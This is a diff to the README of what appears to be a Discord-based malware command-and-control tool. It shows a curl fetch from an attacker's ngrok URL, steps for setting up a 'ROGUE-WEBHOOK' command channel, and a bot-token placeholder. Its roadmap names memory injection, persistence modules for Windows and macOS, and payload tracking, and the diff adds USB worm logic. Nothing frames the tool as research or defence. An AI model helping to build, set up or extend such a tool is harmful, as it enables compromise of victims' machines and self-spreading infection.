@@ -425,7 +425,7 @@ curl https://your-ngrok-url/.svc
 #### **4. Create a Webhook**
 
 * Go to your **command channel**
-* Click the ⚙️ gear icon → **Integrations** → **Create Webhook**
+* Click the gear icon → **Integrations** → **Create Webhook**
 * Name it something like `ROGUE-WEBHOOK`
 * Assign it to the same channel you created earlier
 * Click **Copy Webhook URL**
@@ -447,6 +447,7 @@ BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
 * Integrate memory injection via C
 * Discord command filters
 * Persistence modules for Windows + macOS
+* add usb worm logic for Windows + macOS
 * Full dashboard mode with payload tracking
 
 ---
